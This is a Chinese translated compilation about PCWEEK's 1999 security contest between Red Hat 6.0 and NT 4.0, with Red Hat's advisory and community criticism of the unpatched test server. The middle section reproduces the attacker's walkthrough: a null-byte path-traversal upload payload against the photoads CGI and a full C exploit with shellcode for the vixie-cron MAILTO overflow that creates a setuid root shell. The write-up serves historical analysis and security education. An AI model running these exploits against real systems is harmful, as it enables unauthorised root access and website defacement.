---
title: "PCWEEK 安全测试始末"
date: 2000-01-20T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-46"
---

[quack](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=5) (quack_at_xfocus.org)

PCWEEK 安全测试始末

译者：dream bird

一、引言 


近来（99年9月末），美国的PCWEEK杂志进行了一次关于操作系统安全的评测，他们所选择的系统是Redhat6.0和windows NT4.0。评测的结果很具有戏剧性。我本想把其中的主要文章翻译出来，方便大家了解。但是，当翻译了一部分以后，发现这次评测所涉及的背景相当复杂，如果单独看一两篇文章不可能真正的了解这次评测。所以我决定把相关的材料进行综合，以方便大家阅读。本文中大多为译文，并不完全代表我的观点，其原文版权归原文作者所有。 


二、背景 


美国PCWEEK杂志（ZDNet 的下属刊物），是以对PC产品的评测而闻名的。但就象其名字一样，他们的评测往往仅限于PC和相关的产品，对于向Linux这样的具有UNIX风格的类UNIX系统，他们是缺少经验的，这就直接的决定了其针对这类系统的评测的可信度。 


在前一段时期，PCWEEK曾经进行过一次有关网络操作系统运行效率的测试（中文版见 [http://www.zdnet.com.cn/](http://www.zdnet.com.cn/)），参评的系统有NetWare5、Redhat5.2、windows NT4.0和SUN的solaris7。其结果令很多人吃惊，NT4.0的性能似乎比solaris7的都要好。很多人都对其评测的结果表示怀疑，Novell的副总裁还亲自指出了评测中的一些失误。同时很多具有实际经验的用户指出，系统的效率只是评价系统的一个方面，在实际环境下，可靠性、成本和其他一些指标往往更加起决定性的作用。有些人更加直接的取笑PCWEEK为PCWEAK或PCLEAK。 


似乎是针对上次的评测的不良反响，PCWEEK决定进行一次关于系统的可靠性、可用性、安全性和总体拥有成本的系列评测，而评测的第一项就是有关RedHat6.0和windowsNT4.0的安全性。 


与上次评测不同的是，他们避免了单独的测试web服务器和操作系统，转而采取了另外一种方法。他们在不同的系统上建立实际的并且类似的应用，然后针对不同的系统上建立的类似的应用来评测该系统。这种方法看似合理，但却对进行评测的技术人员要求较高，进行起来有一定的难度。实践证明，正是由于这点导致了评测的戏剧性的结果。 


三、经过 


本文以下部分综合了与这次评测有关的内容，原文您可以从 [http://www.hackpcweek.com/](http://www.hackpcweek.com/) 和 [http://www.redhat.com/](http://www.redhat.com/) 找到。 


PCWEEK为本次评测准备的开场白很有趣： 


“悬赏一千美金，来攻击我们的服务器 


如何对系统的安全进行测试呢？我们首先在两种操作系统上安装类似的应用程序，然后让全世界来攻击。与过去不同的是，本次评测中服务器上运行的是现实世界里的程序，具体说来，是一个为报刊类站点设计的分类广告系统。这个测试不但是对操作系统的考验，同时也是对整体的测试。在NT平台，我们将采用ASP、IIS、MTS和SQLServer 7；在Linux平台上，我们将采用Apache和mod_perl。 


游戏规则 


所要攻击的目标是securelinux.hackpcweek.com和securent.hackpcweek.com。赢得1000美金礼卷的条件是成功的修改主页，或者取得一个名为top secret的绝密文件。我们拒绝任何人在没有取得成功的情况下，破坏服务器的运行。” 


PCWEEK给出了简单的服务器配置清单。针对NT的配置清单很长，完全可以说这种配置是完美的了；而对于RedHat的配置短到了只有20行，每行大都只有三五个单词，可以说一般的用户配置都会接近这个水准。以下是对RedHat的配置清单： 


“在磁盘上配置多个分区/usrvartmpvar（原文如此）。

安装RedHat 6.0 ，并且不安装SMTP、FTP和NEWS等服务。

安装Photoads （一个第三方软件，由perl写成的CGI，实现用户载入分类广告的功能，详见 [http://www.hoffice.com/](http://www.hoffice.com/)）， 


Chmod 777 the photoads directory ，

Chmod 755 cgi-bin ，

Chmod 766 kas_data.pl ，

Chmod 766 adnumber.num ，

Chmod 766 ads_data.pl ，

Chmod 755 all *.cgi files ， 


为photoads配置缺省目录，

将上载文件的长度设置为0， 

删除不需要的用户 。

Set root password to （to what？）。

在inetd.conf中禁止所有的服务。

以用户nobody来配置并运行 Apache服务器，

禁止SSI（server side includes ）。

这种配置实现了security-howto中的建议和apache group的安全提示。” 


PCWEEK到底真的实现了security-howto的建议了么？实际是没有的，作为一个系统管理人员，你的责任就是维护系统的运行，其中包括很重要的一点，就是更新有漏洞的软件。而且UNIX是极其灵活的系统，这种软件的更新完全可以自动的由系统来进行。 


在如上所述的情况下，PCWEEK就将两台服务器安置在了防火墙后面，并且保留web服务的80号端口，以便访问和攻击。 


结果是显而易见的，但对于一个有关操作系统的安全性的测试又是很有戏剧性的 。首先是在RedHat上安装的第三方软件存在漏洞，使一名叫jfs的cracker得以进入系统；然后jfs他们利用一个已知的系统漏洞（修补程序已经发布一个月左右了）得到了root的权限，并成功的修改了服务器的主页。 


以下是jfs对攻击过程的叙述： 


“一次实际攻击的解析（攻击PCWEEK服务器）By Jfs 


首先，我必须搜集有关要攻击的主机的信息，看一看开放了哪些端口，有哪些端口可能进行攻击。经过一翻检查，我发现大部分的端口不是被防火墙保护着，就是由于tcp wrapper的原因而不能使用，只有HTTP服务器可以下手了。 


lemming:~# telnet securelinux.hackpcweek.com 80 

Trying 208.184.64.170... 

Connected to securelinux.hackpcweek.com. 

Escape character is '^]'. 

POST X HTTP/1.0 

HTTP/1.1 400 Bad Request 

Date: Fri, 24 Sep 1999 23:42:15 GMT 

Server: Apache/1.3.6 (Unix) (Red Hat/Linux) 

(...) 

Connection closed by foreign host. 

lemming:~# 


好，这是一台运行apache和Red Hat的机器。从PCWEEK的提示得知这台服务器也应该运行mod_perl，但是mod_perl会在服务器上留下一些特征，而这台服务器所发的报头却并没有这些迹象。 


Apache 1.3.6并没有附加任何远端的用户可以使用的CGI程序，但我并不知到RedHat是否加了一些进去，所以我试着攻击了一些常见的CGI漏洞（tect-cgi，wwwboard，count.cgi……） 


在试验无效的情况下，我试着找出这个web站点的目录结构，从HTML 页所获得的信息我推断，这个web服务器在DocumentRoot下有如下目录： 


/ 

/cgi-bin 

/photoads/ 

/photoads/cgi-bin 


我马上对photoads产生了兴趣，我想这很可能是一个可安装的软件包。经过一翻网上搜索，我终于发现这个photoads是一个由“The Home Office Online”（[www.hoffice.com](http://www.hoffice.com/)）发行的商业软件包，售价149美圆，并且允许你使用其原代码（perl），这样你就可以修改它了。 


我求助于一位朋友，让我看看他的photoads。这使我有机会看到securelinux上所使用的软件的拷贝。 


我看了缺省的安装文件，我可以从广告数据库（在 [http://securelinux.hackpcweek.com/photoads/ads_data.pl](http://securelinux.hackpcweek.com/photoads/ads_data.pl)）中获得所有用户的广告口令。我也试着访问配置文件 /photoads/cgi-bin/photo_cfg.pl ，但由于服务器的安装设置使我没法达到目的。 


我发现，通过脚本/photoads/cgi-bin/env.cgi（类似test-cgi）我可以知道DocumentRoot目录在文件系统中的位置（/home/httpd/html），另外还有一些其他的有用的数据（服务器以什么用户的身份运行的，这次是以nobody来运行的）。 


所以，我首先试着用SSI（Server side includes ）和mod_perl 向HTML中嵌入命令，方法如下： 


<!--#include file="..."--> for SSI 

<!--#perl ...--> for mod_perl 


通过一个perl正则表达式，服务器的脚本过滤掉了大部分输入，几乎没有多少空间可以使用。但我也发现了一个由用户付值量，它在变成HTML代码之前并没有对奇怪的变量值进行检查，这就给我了一个机会可以在HTML代码中嵌入命令，以便服务器端解析。 


post.cgi的36行如下： 


print "you are trying to post an AD from another URL:<b> $ENV{'HTTP_REFERER'}\n"; 


$ENV{'HTTP_REFERER'}是一个由用户提供的变量（为了保证正确性，你得了解一些HTTP报头的工作原理），这个变量可以让我们把任何HTML代码加进去，不管代码到底是什么样。 


该真正的用getit.ssi和getit.mod-perl（两个小程序，此处略去）工作了 


我们采用以下的方法： 


lemming:~# cat getit.ssi | nc securelinux.hackpcweek.com 80 


但不幸的是这台机器并未配置SSI和mod_perl，我钻进了死胡同。 


我决定从CGI脚本中找漏洞。perl脚本的漏洞大多出在open()、system()或者 ''调用中。前者允许读写和执行，而后两个允许执行。 


程序中并没有后两个情况出现，但的确有几个open()调用： 


lemming:~/photoads/cgi-bin# grep 'open.*(.*)' *cgi | more 

advisory.cgi: open (DATA, "$BaseDir/$DataFile"); 

edit.cgi: open (DATA, ">$BaseDir/$DataFile"); 

edit.cgi: open(MAIL, "|$mailprog -t") || die "Can't open $mailprog!\n"; 

photo.cgi: open(ULFD,">$write_file") || die show_upload_failed("$write_file $!"); 

photo.cgi: open ( FILE, $filename ); 

(...) 


对 $BaseDir 和 $DataFile我们动不了什么手脚，因为它们都是在配置文件中定义的，程序运行以后是改变不了的。 


$mailprog 也是如此

但其余的两行值得好好研究 


photo.cgi 的132行如下： 


$write_file = $Upload_Dir.$filename; 

open(ULFD,">$write_file") || die show_upload_failed("$write_file $!"); 

print ULFD $UPLOAD{'FILE_CONTENT'}; 

close(ULFD); 


如果我们可以修改变量$write_file，那么我们就可以写系统中任何文件了。这个$write_file变量定义如下： 


$write_file = $Upload_Dir.$filename; 


$Upload_Dir 是由配置文件定义的，我们没法修改，那么$filename呢？ 


photo.cgi的226行如下： 


if( !$UPLOAD{'FILE_NAME'} ) { show_file_not_found(); } 

$filename = lc($UPLOAD{'FILE_NAME'}); 

$filename =~ s/.+\\([^\\]+)$|.+\/([^\/]+)$/\1/; 

if ($filename =~ m/gif/) { 

$type = '.gif'; 

}elsif ($filename =~ m/jpg/) { 

$type = '.jpg'; 

}else{ 

{&Not_Valid_Image} 

} 


$filename的值来自$UPLOAD{'FILE_NAME'}（是由表格提交给CGI的变量中解析出的）。为了让我们到我们希望到的地方，$filename必须满足一个正则表达式，我们不能简单的发送我们需要的文件名，例如“../../../../../../../../etc/passwd ”就是不行的，它在通过如下的替换后，将什么也得不到： 


$filename =~ s/.+\\([^\\]+)$|.+\/([^\/]+)$/\1/; 


如果$filename与这个正则表达式相匹配，那么它将变成ASCII码的1（SOH）。除此之外$filename还必须包括“gif”或“jpg”，否则它将无法通过Not_Valid_Image的检查。 


在进行了一翻尝试，我终于在Phreck的有关perlCGI的安全的文章的帮助下发现了 /jfs/\../../../../../../../export/www/htdocs/index.html%00.gif 可以让我们提交index.html文件（我们必须修改的主页）。但在上载前，我们还得想办法骗过一些脚本代码。 


我们发现如果我们以POST的方法发送表格的话，我们就不能蒙混过关（%00将不会被解析），所以我们只能用GET了。 


在photo.cgi的256行，我们可以看到一段代码会对我们刚刚上载的文件的的内容进行检查，如果文件不符合特定的图象规格（主要是宽、高和大小），脚本将会删除或改写该文件，这是我们所不希望见到的，至少我们要在服务器上留下一些我们的资料。（注意，photo.cgi脚本可以用来上载一个由你的广告使用的广告图片。） 


PCWEEK在配置文件中将ImageSize设置成0，所以我们不用去管有关JPG的部分，让我们将注意力集中于GIF部分。 


if ( substr ( $filename, -4, 4 ) eq ".gif" ) { 

open ( FILE, $filename ); 

my $head; 

my $gHeadFmt = "A6vvb8CC"; 

my $pictDescFmt = "vvvvb8"; 

read FILE, $head, 13; 

(my $GIF8xa, $width, $height, my $resFlags, my $bgColor, my $w2h) = unpack $gHeadFmt, $head; 

close FILE; 

$PhotoWidth = $width; 

$PhotoHeight = $height; 

$PhotoSize = $size; 

return; 

} 


photo.cgi的140行如下： 


if (($PhotoWidth eq "") || ($PhotoWidth > '700')) { 

{&Not_Valid_Image} 

} 

if ($PhotoWidth > $ImgWidth || $PhotoHeight > $ImgHeight) { 

{&Height_Width} 

} 


所以我们不得不把$PhotoWidth设置成小于700，不是""，并且比ImgWidth小（缺省是350）。

所以有$PhotoWidth !="" && $PhotoWidth<350。

对于$PhotoHeight，它必须比$ImgHeight 小（缺省是250）。所以$PhotoWidth = $PhotoHeight = 0 正好。从脚本中的付值方法来看，我们只要将该值的第6和9字节置0（NUL）就可以了。 


我们保证我们的FILE_CONTENT符合以上的条件，并继续进行下一步了…… 


chmod 0755, $Upload_Dir.$filename; 

$newname = $AdNum; 

rename("$write_file", "$Upload_Dir/$newname"); 

Show_Upload_Success($write_file); 


经过以上的代码，我们的文件被重命名或者说移动到了我们不希望的地方了。 


查看有关$AdNum变量值的最后代码，我们看到它只能包含阿拉伯数字： 


$UPLOAD{'AdNum'} =~ tr/0-9//cd; 

$UPLOAD{'Password'} =~ tr/a-zA-Z0-9!+&#%$@*//cd; 

$AdNum = $UPLOAD{'AdNum'}; 


其他的东西都将被去掉，所以我们不能在这儿使用../../../的蒙骗手法了。 


怎么办？rename()函数需要两个路径参数，一个是新的，一个是旧的……等等，这个函数没有错误检验，所以如果它出错的话，程序就会跳过去，我们怎样能使它出错呢？用一个非法的文件名。Linux系统缺省的最长的文件名的限制是1024（MAX_PATH_LEN），所以如果我们能让这个脚本把我们的文件重命名成一个比1024字节长的文件的话就行了。 


下一步我们将提交一个大约1024字节的广告编号（AD number）。 


现在，脚本没有如设想的运行，因为他只允许我们上传存在的广告编号的图片。（做那个10^1024的数字花了我们不少的时间。） 


又是一个死胡同？ 


没有，那个不完善的输入检测函数让我们有机会进一步的改进这个数字。简单的浏览一下edit.cgi这个脚本，想一想，如果你输入一个名字然后是回车，最后是那1024个数字，会发生什么？哈哈，有了。 


那个long.adnum文件让我们有机会建立一个新的广告。 


当我们可以骗过了广告编号检查后，我们可以利用脚本办到以下的事情： 


建立/改写任何nobody有权限的文件，并且可以使该文件是我们希望的内容（除了为GIF留的有NUL的文件头）。 


好，让我们试试。 


确认脚本overwrite.as.nobody允许我们得到以上的权限。 


直到目前为止一切良好，我们调整脚本以便改写index.html……但是没成功。 


可能是我们没有权限改该文件（可能因为文件的所有者是root，或者文件没设置写权限）。怎么办？我们另寻出路吧。 


我们试着改写一个CGI，看看我们能否让它为我们工作。这样我们就可以寻找“绝密”文件了，那就胜利在望了。 


我们修改了overwrite脚本，很好，他允许我们改写CGI！ 


我们决定不修改那些重要的（相对严谨）的CGI，我们选择了advisory.cgi（管它是干什么的呢？）。 


这样我们就可以上传一个能允许我们执行命令的shell脚本了，太好了…… 


但是，当你以CGI的形式运行shell脚本的时候，你得在脚本的第一行对此加以说明，就象下面这样： 


#!/bin/sh 

echo "Content-type: text/html" 

find / "*secret*" -print 


但是，别忘了，我们的第6、7、8、9字节必须是0或者一个很小的值，以适应有关图形大小的规定…… 


#!/bi\00\00\00\00n/sh 


这样是不行的，内核只读了前5字节，然后就试图去执行“#!/bi”……就我所知，还没有我们可以运行的3个字节（外加#!两个字节）的shell。又是死胡同…… 


一个ELF（linux的缺省的可执行文件的格式）文件给了我们答案，结果我们成功的将那几个字节置成了0x00，太妙了。 


现在我们需要将一个ELF可执行文件放到远端的服务器上。我们必须使它符合URL的标准，因为我们只可以用GET的方法，不能用POST，这样我们至少要符合最长URI的限制。对于Apache服务器最长的URI为8190字节，别忘了我们还要用一个很大的1024个字符的数字，所以给我们的符合URL标准的ELF程序留下的空间只有7000字节了。 


它只能是个小程序了。 


lemming:~/pcweek/hack/POST# cat fin.c 

#include <stdio.h> 

main() 

{ 

printf("Content-type: text/html\n\n\r"); 

fflush(stdout); 

execlp("/usr/bin/find","find","/",0); 

} 


编译后如下： 


lemming:~/pcweek/hack/POST# ls -l fin 

-rwxr-xr-x 1 root root 4280 Sep 25 04:18 fin* 

lemming:~/pcweek/hack/POST# strip fin 

lemming:~/pcweek/hack/POST# ls -l fin 

-rwxr-xr-x 1 root root 2812 Sep 25 04:18 fin* 

lemming:~/pcweek/hack/POST# 


然后让它符合URL的标准： 


lemming:~/pcweek/hack/POST# ./to_url < fin > fin.url 

lemming:~/pcweek/hack/POST# ls -l fin.url 

-rw-r--r-- 1 root root 7602 Sep 25 04:20 fin.url 


要在我们的脚本中使用的话，它是过大了。 


我们只有靠我们的直觉来手工编辑这个二进制文件了，我们决定将这个可执行文件中“GCC”字符串后的所有内容都删除。这么做几乎没有任何理论的根据，如果要根据的话就得研究ELF规范了，但是这么做似乎还可以： 


lemming:~/pcweek/hack/POST# joe fin 

lemming:~/pcweek/hack/POST# ls -l fin 

-rwxr-xr-x 1 root root 1693 Sep 25 04:22 fin* 

lemming:~/pcweek/hack/POST# ./to_url < fin > fin.url 

lemming:~/pcweek/hack/POST# ls -l fin.url 

-rw-r--r-- 1 root root 4535 Sep 25 04:22 fin.url 

lemming:~/pcweek/hack/POST# 


现在，我们合并我们的工作成果，然后运行…… 


我们查看在我们目录中的名为get、sec、find的文件，希望获得更多的信息。 


在这里你会找到to_url 脚本，和一些简单的C文件，这些东西和URL一起解析，就大功告成了。 


现在我们上载这个CGI，然后用我们喜欢的浏览器访问它： 


wget [http://securelinux.hackpcweek.com/photoads/cgi-bin/advisory.cgi](http://securelinux.hackpcweek.com/photoads/cgi-bin/advisory.cgi) 


这样我们对服务器上的/ 进行了全面的查找。 


但是他们的“绝密”文件没在那，或者以nobody的身份无法访问。 


我们尝试了一些命令组合，如locate、ls和一些其他命令，但无济于事。 


如果这个文件存在，那么它究竟在哪。 


现在问题严重了，必须要root的权限了。正象我的一位朋友说的那样，有现成的为什么不用呢？所以，根据我们知道的有关那台服务器的情况（Linux，i386，因为我机器就是i386，并且我的那个ELF文件已经在它上面运行了）。我们查找了软件更新的数据，发现了一个对所有版本的RedHat都可以利用的crontab漏洞（译者注：细节将在后面讨论）。 


你可以在最近的 bugtraq/securityfocus 中找到。太好了，我们根据我们的需要对其加以修改，显然我们根本不需要一个交互的根用户shell，我们只要做一个nobody可访问的suidroot的shell就行了： 


#include <stdio.h>

#include <sys/types.h>

#include <sys/stat.h>

#include <unistd.h>

#include <pwd.h>

char shellcode[] =

"\xeb\x40\x5e\x89\x76\x0c\x31\xc0\x89\x46\x0b\x89\xf3\xeb"

"\x27w00w00:Ifwewerehackerswedownyourdumbass\x8d\x4e"

"\x0c\x31\xd2\x89\x56\x16\xb0\x0b\xcd\x80\xe8\xbb\xff\xff"

"\xff/tmp/w00w00";

int main(int argc,char *argv[])

{

FILE *cfile,*tmpfile;

struct stat sbuf;

int x;

chdir("/tmp");

cfile = fopen("/tmp/cronny","a+");

tmpfile = fopen("/tmp/w00w00","a+"); // ,S_IXUSR|S_IXGRP|S_IXOTH);

fprintf(cfile,"MAILTO=");

for(x=0;x<96;x++)

fprintf(cfile,"w00w00 ");

fprintf(cfile,"%s",shellcode);

fprintf(cfile,"\n* * * * * date\n");

fflush(cfile);

fprintf(tmpfile,"#!/bin/sh\ncp /bin/bash /tmp/.bs\nchmod 4755 /tmp/.bs\n");

fflush(tmpfile);

fclose(cfile),fclose(tmpfile);

chmod("/tmp/w00w00",S_IXUSR|S_IXGRP|S_IXOTH);

execl("/usr/bin/crontab","crontab","/tmp/cronny",(char *)0);

} 


经我们修改后，使这个shell指向了/tmp/.bs。我们重新上载CGI，并且用我们的浏览器使其运行，然后我们就准备进行测试了。 


我们做了一个CGI进行初次测试，它将执行ls /tmp。我们确实实现了suidroot。 


( ... ) 


execlp("/bin/ls","ls","-ula","/tmp",0); 


( ... ) 


我们接着将一个用来替换index.html的文件上载到了/tmp/xx。 


( ... ) 


execlp("/tmp/.bs","ls","-c","cp /tmp/xx /home/httpd/html/index.html",0); 


( ... ) 


应该做最后要运行的程序了： 


( ... ) 


execlp("/tmp/.bs","ls","-c","cp /tmp/xx /home/httpd/html/index.html",0); 


( ... ) 


游戏到此结束了。 


共耗时20小时。 


最后我们将我们的资料上载并拷贝到了一个安全并且nobody可见的地方，然后向讨论组发了一个消息并且开始等待回音了。 


（从 [http://hispahack.ccc.de/programas/pcweek.zip](http://hispahack.ccc.de/programas/pcweek.zip) 可以下载我们所用的程序和一些脚本。） 


Jfs - !H'99 

jfs@gibnet.gi 

[http://hispahack.ccc.de](http://hispahack.ccc.de/) ” 


有关Redhat的cron安全漏洞的信息可以在Redhat的web站点找到。具体的情况如下： 


“RedHat公司安全建议

Package vixie-cron

Synopsis Buffer overflow in cron daemon

Advisory ID RHSA-1999:030-02

Issue Date 1999-08-25

Updated on 1999-08-27

Keyword svixie-cron crond MAILTO

…… 


详细描述：

通过建立一个带有特殊的、格式化的MAILTO环境变量的crontab ，本地用户有可能使cron服务程序的cron_popen() 函数中的定长缓冲区发生溢出。由于cron守护进程是由root来运行的，所以从理论上讲，本地用户是有可能利用这个溢出来获取root的权限的。

…… 


解决办法：

针对不同的体系结构的硬件，下载不同的RPM包

然后运行 rpm -Uvh <文件名>

然后运行/etc/rc.d/init.d/crond restart 来重新启动cron进程。

……” 


从以上的资料可以对整个的攻击过程一目了然了。RedHat在8月25日发现的漏洞，然后在8月27日这个漏洞就得到了修补。系统安全不是一个状态，而是一个过程。事情整整经过了一个月，就是再懒惰的系统管理员也会为重要的服务器系统安装上修补后的程序了，但是PCWEEK的测试人员却没有进行这项工作。更有甚者，PCWEEK 在这次测试之后，又进行狡辩： 


“针对这次的测试，很多人批评我们没有为RedHat6.0更新二十一个系统安全的补丁。我们的解释如下：本次测试中，我们仅仅安装了从软件厂商那得到的软件（当然不包括应用程序）。我们并未对NT服务器多加关照。我们确实为NT安装了service pack 5，但是这主要是因为SP5只有一个文件。” 


在此我们不讨论NT的SP5中到底有什么宝贝，我们仅仅讨论一下系统更新的问题。类UNIX系统（如GNU/Linux）是非常灵活的，再加上RedHat是以RPM的形式来对软件进行管理的，软件更新不应当是问题。如果是谨慎的系统管理员，会加入有关安全的邮件列表，如redhat-watch-list-request@redhat.com和redhat-announce-list-request@redhat.com，随时手动的更新系统；如果是懒惰的系统管理员，他完全可以编写一个系统更新的脚本，然后将其加入crontab中了事（RPM是完全的支持通过FTP进行系统更新的）。无论采用以上哪种方法，也不会象PCWEEK那样被动了。 


除此之外，PCWEEK还对有关第三方软件（photoads CGI）造成的漏洞做了如下的辩解： 


“在此次测试中出现的问题使我们对开放原代码软件产生了怀疑，我们可以肯定的说，如果这个破坏我们系统的hacker没有看到我们的脚本代码的话，他是不可能成功的。……” 


首先，这个第三方软件并不是开放原代码软件，如果你不获得许可协议的话，你是无法获得原代码的，这就直接的决定了该软件的性质并不是开放原代码的，开放原代码软件的主要的评判标准应该是这个软件的开发方法是否为开放原代码的方式。 


其次，如果PCWEEK是公正的话，他们在使用该软件做这样的一个测试之前，为什么没有对软件的安全性进行检察呢？至少PCWEEK是有权力并且有能力（值得怀疑）修补这个软件的安全漏洞的。 


这个混乱并且非常具有戏剧性的评测并未就此了事，整个Linux社区对这次测试反映非常的强烈，很多用户和媒体都发表了评论。 


四、评论 


在Linux服务器被攻击后的一周内，linux weekly news就针对这次测试做了简要的评论，其译文如下： 


“在PCWEEK的测试中，有人成功的修改了Linux服务器的网页，这也许会使所有的反Linux份子感到欣慰。但在用这件事为证据来证明Linux存在安全隐患之前，我们应当花些时间来看一看这个系统是如何被破坏的。你可以在PCWEEK的网站（[www.hackpcweek.com](http://www.hackpcweek.com/)）看到这次攻击的具体过程。 


这次攻击可以分成两个步骤。第一步是使任意的程序可以在服务器端运行。这个cracker（代号为jfs）利用了photoads CGI脚本的漏洞达到了这个目的，photoads是PCWEEK在目标站点上运行的一个提供分类广告的CGI脚本程序。并非Linux和Apache导致了这个安全漏洞。显而易见，是一个第三方的商业软件导致了这个漏洞。 


可以在目标系统中运行程序之后，这个cracker需要使用root权限。由于该系统没有进行必要的针对系统安全的软件升级，具体的说，没有对cron进行更新，而RedHat在8月25日就发布了这个安全补丁。jfs只需要执行一个简单的、并且是现成的攻击程序，root的权限就到手了。 


我们可以得到这样一个结论，这次测试中的Linux服务器是并未经过安全配置的。一个用来做安全测试的系统，至少应当更新有关系统安全的软件。并且对于将要使用的第三方软件，应当给予慎重考虑。” 


有关Linux的另一个新闻站点linuxtoday也发表了许多读者的文章，评论这次所谓的评测。在此我选择了一篇有代表性的文章，您可以在 [http://www.linuxtoday.com/stories/10767_flat.html](http://www.linuxtoday.com/stories/10767_flat.html) 找到原文。译文如下： 


“ZDNet 承认在最近的安全评测中存在错误 


Oct 4, 1999, 23:19 UTC

By Arne W. Flones 


针对近来的hacker攻击PCWEEK的测试，ZD实验室在今天承认了他们由于嫌麻烦的缘故，故意的没有对两个参评系统之一的RedHat系统更新二十一个安全补丁。（详见PCWEEK的文章：CGI script opens door） 


在这次所谓的安全评测中，ZDNet邀请hacker们（应该是cracker吧）攻击两个不同的参评系统，其中一个运行Windows NT，另一个运行RedHat发行的GNU/Linux。这次测试可以看作是八月份的有关NT和Apach+Linux的类似测试的延续。在Linux团体一致批评该测试缺乏客观性的情况下，ZDNet的主任John Taschek 作出了如下的解释：PCWEEK组织这次测试的目的是检验系统的安全性能。我们并不关心哪种操作系统先被闯入。我们所希望的是在实践的基础上为实现系统安全确立一定的基本原则。最后他说，我们并不关心胜负，我们也将不评论胜负。仅仅是一次实践。他们对别人的异议置之不理，继续进行这次所谓的评测。在9月24日，一名cracker利用了web程序和crond程序的漏洞成功的攻击了Linux系统。 


当这名cracker所使用的攻击方法被公开之后，人们立刻发现这两个安全漏洞很容易就可以被堵住。第一个安全漏洞是由CGI脚本引起的，只要在编写脚本时对系统安全稍加重视就可以避免。这是一个单独的应用程序的问题，与Linux系统无关。第二个安全漏洞在八月份就已经被RedHat公开并解决了。就算是ZDNet忽略了第一个漏洞，但他们完全应当知道第二个漏洞。这个cracker是利用了两个安全漏洞才得以成功的。 


今天，ZDNet 透露了，他们故意的没有为Linux系统安装21个有关安全的补丁程序，其中就包括防止那个cracker所使用的攻击方法的补丁程序。这种说法马上在资深用户、安全专家和Linux 团体中引起了很大的反响。 


作为构成Linux 的一条基本原则，Linux对任何人都是自由的，完全没有理由去等待一个安全更新公开发行后再更新系统。这种安全补丁在Linux世界里是非常普通的。每当一个发现安全漏洞之后，很快就会有人对其进行修补，并且补丁程序很快就会在公开的网络论坛中发布。开放原代码的特点使得任何人都可以对补丁的正确性进行检验。典型的，同补丁程序一起发布的还有一个能对这个安全漏洞进行攻击的程序。这种方法可以戏剧性的减少更新系统所带来的风险。通常这种更新对系统改变是很小的，并切是很容易单独进行测试的。这样只需要很少的努力、很短的时间，IT主管就会了解到实际的效果，而这些补丁程序也就会自然而然被的加入重要的系统中去了。这种做法的结果就是这些补丁很快就会在系统中发挥作用，使公司的数据安全得到保证。 


这与Windows NT世界里的情况是完全不同的，在NT的世界里微软控制着全部的原代码。由微软Windows 的特性所决定，Windows的用户必须容忍安全漏洞，直到微软发布一个很大的server pack为止，而且这种发布还不是经常性的。这种安全策略是值得怀疑的。而且对这些补丁程序的测试也是一场噩梦，其原因在于无法单独的对每一个修补进行测试。并且由于微软将所有的补丁程序和系统改进做到了一个程序里，这种方法使得在企业范围内进行安装变得很危险。人们不知道将会发生什么。显而易见，Windows和Linux的世界中有不同的游戏规则，ZDNet 实验室却忽略了这一点。 


针对人们对ZD简单的、不公平的忽略了21个安全补丁程序的抱怨，ZDNet 给出了如下的解释：大型企业往往不愿更新21个单独的修补程序，反之更愿意去使用一个很大的，并且内容很混乱的修补程序。ZDNet 没有为这种荒谬说法提供任何的根据。这种说法是缺少实践和理性的。完全没有理由说微软的那种无法测试的、集成化的软件比比几个小的、易于管理的软件更加优越。值得注意的是：虽然ZDNet忽略了21个很小的、便于检验的补丁程序，但在测试中他们并没有忽略微软那个最新的、庞大的NT SP5。 


ZDNet的说法是站不住脚的。ZDNet不仅要对那个蹩脚的CGI脚本负责，而且也要对忽略了21个已知的安全漏洞负责。今天他们承认由于故意的没有安装补丁程序导致了测试的失败。他们知道任何cracker都会首先攻击这21个弱点。毫不奇怪，仅仅几天Linux系统就被破坏了。ZDNet 的无能决定了这个结局的必然性。 


这是典型的渎职行为。以ZDNet现在的技术水平，他们是不可能进行客观的评测的。以我对此事的了解，继续开这种毫无意义的玩笑是不负责任的。” 


其他方面的评论也很多，在此我就不一一列举了。相信通过以上的两段译文，您已经对这个评测有更深的理解了。 


五、总结 


正当我的翻译工作快要进行完时，微软在其网站上发表了一篇题为《Linux的神化》的文章，对Linux 进行了很全面的贬低，在其文章中多次的引用了PCWEEK的测试结论。如果对PCWEEK的测试不是很了解的读者，一定会被微软的文章所迷惑。由此可见，评测的确有很大的片面性。如果要真正的评价一个系统的好坏，不能单单只看评测，实践才是检验真理的唯一标准！ 


--------------------------------------------------------------------------------


版权所有 1999 NJLUG

出版于第45期《Linux公报》1999年9月 中文版第十一期
